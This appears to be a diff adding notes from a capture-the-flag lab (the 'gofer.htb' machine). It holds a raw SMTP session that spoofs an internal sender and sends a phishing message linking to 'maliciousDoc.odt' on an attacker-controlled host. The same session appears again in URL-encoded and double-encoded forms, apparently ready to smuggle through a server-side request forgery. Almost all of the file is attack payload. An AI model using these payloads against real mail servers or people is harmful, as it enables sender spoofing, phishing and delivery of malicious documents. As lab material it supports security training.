@@ -1,0 +1,15 @@
+EHLO gofer.htb
+MAIL FROM: jdavis@gofer.htb
+RCPT TO: jhudson@gofer.htb
+DATA
+Subject: Processing Document
+Message: Hello Jocelyn, can u process this document? because i need it. thank u
+http://10.10.14.34:8000/maliciousDoc.odt
+.
+QUIT
+
+
+EHLO%20gofer.htb%0AMAIL%20FROM:%20jdavis@gofer.htb%0ARCPT%20TO:%20jhudson@gofer.htb%0ADATA%0ASubject:%20Processing%20Document%0AMessage:%20Hello%20Jocelyn,%20can%20u%20process%20this%20document?%20because%20i%20need%20it.%20thank%20u%0Ahttp://10.10.14.34:8000/maliciousDoc.odt%0A.%0AQUIT
+
+
+EHLO%2520gofer.htb%250AMAIL%2520FROM%3a%2520jdavis%40gofer.htb%250ARCPT%2520TO%3a%2520jhudson%40gofer.htb%250ADATA%250ASubject%3a%2520Processing%2520Document%250AMessage%3a%2520Hello%2520Jocelyn,%2520can%2520u%2520process%2520this%2520document%3f%2520because%2520i%2520need%2520it.%2520thank%2520u%250Ahttp%3a//10.10.14.34%3a8000/maliciousDoc.odt%250A.%250AQUIT
